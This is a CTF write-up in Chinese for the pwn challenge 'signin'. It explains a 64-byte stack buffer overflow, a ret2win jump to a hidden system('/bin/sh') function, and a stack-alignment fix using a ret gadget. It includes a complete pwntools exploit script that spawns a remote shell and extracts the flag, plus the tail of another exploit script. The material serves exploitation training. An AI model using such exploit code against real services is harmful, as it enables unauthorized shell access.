    raise EOFError("no flag in output")


def main():
    for i in range(1, 31):
        try:
            if attempt():
                return
        except EOFError as e:
            log.warning("attempt %d failed: %s", i, e)
        time.sleep(0.2)
    log.failure("gave up")


if __name__ == "__main__":
    main()
```

<div class="pagebreak"></div>

# signin Writeup

agent梭了大部分,但是卡在栈对齐上了,提醒了一句.

很简单,见过一模一样的,但是计组水平太低难以理解.

- 分类：pwn
- 附件：`signin`
- flag：`flag{Wh@T-Wou1D-yOu-IlKe_F0R_D1NN3r3e2051d}`

## 思路

1. 保护机制：non-PIE（`ET_EXEC`，`e_entry = 0x4010b0`）、无 canary、NX 开启、Partial RELRO（有 `GNU_RELRO`，无 `BIND_NOW`）。地址全是固定常量，**不需要泄漏**。
2. 漏洞点 `main` @ `0x401196`：局部 `char name[64]`（`rbp-0x40`），却 `read(0, name, 0x400)` —— 向 64 字节缓冲区读入 1024 字节，直接覆盖返回地址。
3. 程序里有一个**任何代码路径都不引用**的函数 `win()` @ `0x4011dd`：

   ```c
   void win(void) { puts("You win!"); system("/bin/sh"); exit(0); }
   ```

   典型的 ret2win 目标。
4. 返回地址偏移：`0x40`（缓冲区）+ 8（saved RBP）= `0x48`；payload 共 88 字节，用 `send` 而不是 `sendline` 发送，让 `read` 恰好返回 88 字节、shell 继承干净的 stdin。
5. 关键坑——栈对齐：System V ABI 要求执行 `call` 时 `RSP % 16 == 0`，即进入函数体时 `RSP % 16 == 8`。从 IDA 的 frame record 看：

   ```
   rbp-0x40 .. rbp-0x01   name[64]        <- 64 填充字节
   rbp+0x00               saved RBP       <-  8 填充字节
   rbp+0x08               return address  <-  p64(0x40101a)（对齐滑板）
   rbp+0x10                              <-  p64(0x4011dd)（win）
   （frame_off_lvars = 0x00，frame_off_savregs = 0x40，frame_off_retaddr = 0x48）
   ```

   逐条跟踪 `main` 尾声的 RSP 奇偶性：

   ```
   main 入口              RSP % 16 == 8
   push rbp                RSP % 16 == 0
   sub rsp, 0x40           RSP % 16 == 0
   leave（pop rbp）        RSP % 16 == 8
   ret                     RSP % 16 == 0   <-- 直接落进 win()
   ```

   所以直接返回到 `win()` 时栈是 16 字节对齐（`RSP % 16 == 0`），而 `win()` 是按 `RSP % 16 == 8` 的约定编写的：它内部的 `puts`/`system` 调用会落在 16 字节未对齐的栈上。`puts` 侥幸存活，`system()` 在 libc 的 `movaps`（要求 16 字节对齐的操作数）上崩溃，进程在 `/bin/sh` 起来之前就退出，现象是打出 `You win!` 后立即 EOF、拿不到可用的 shell。在返回地址前多塞一个裸 `ret` gadget（`0x40101a`）消耗 8 字节把栈拨正，`win()` 入口恢复 `RSP % 16 == 8`，shell 即可正常工作。
6. 二进制里没有 `pop rdi; ret`，手工拼 `system("/bin/sh")` 的 ROP 链不可行，`win()` 就是预期落点。

## EXP

```python
import sys

from pwn import *  # noqa: F401,F403

HOST = "<TARGET>"
WIN = 0x4011DD           # 未被引用的 win()：puts("You win!"); system("/bin/sh")
RET = 0x40101A           # 裸 ret，把 win() 入口的 RSP % 16 拨回 8

BUF_OFF = 0x40           # name[64] 位于 rbp-0x40
RET_OFF = BUF_OFF + 8    # 返回地址位于 rbp+0x08

PROMPT = b"Enter your name: "

context.arch = "amd64"
context.log_level = args.LOG_LEVEL or "info"

PAYLOAD = (b"A" * BUF_OFF            # name[64]
           + b"B" * (RET_OFF - BUF_OFF)   # saved RBP
           + p64(RET)                     # 对齐滑板
           + p64(WIN))                    # win() -> system("/bin/sh")

FLAG_RE = rb"[A-Za-z0-9_]*\{[^}\r\n]{1,200}\}"


def start():
    if args.LOCAL:
        return process("./signin")
    return remote(HOST, <PORT>, ssl=True, sni=HOST)


def main():
    log.info(f"target  : {HOST}:<PORT> (TLS)")
    log.info(f"win()   : {WIN:#x}   align slide: {RET:#x}")
    log.info(f"payload : {len(PAYLOAD)} bytes "
             f"(64 buf + 8 saved-rbp + 8 ret + 8 win)")

    io = start()
    io.recvuntil(PROMPT)
    io.send(PAYLOAD)                     # 用 send 而非 sendline：read 恰好吃掉 88 字节

    if args.CMD:
        # 非交互模式：向弹到的 shell 喂一条命令并 dump 输出
        io.sendline(args.CMD.encode() if isinstance(args.CMD, str) else args.CMD)
        try:
            out = io.recvrepeat(float(args.WAIT))
        except EOFError:
            out = b""
        sys.stdout.write(out.decode("latin-1", "replace"))
        sys.stdout.flush()

        m = re.search(FLAG_RE, out)
        if m:
            log.success(f"FLAG: {m.group(0).decode()}")
            return 0
        io.close()
        return 1

    # 默认：把弹到的 /bin/sh 交给终端
    io.interactive()
    return 0


if __name__ == "__main__":
    sys.exit(main())
```
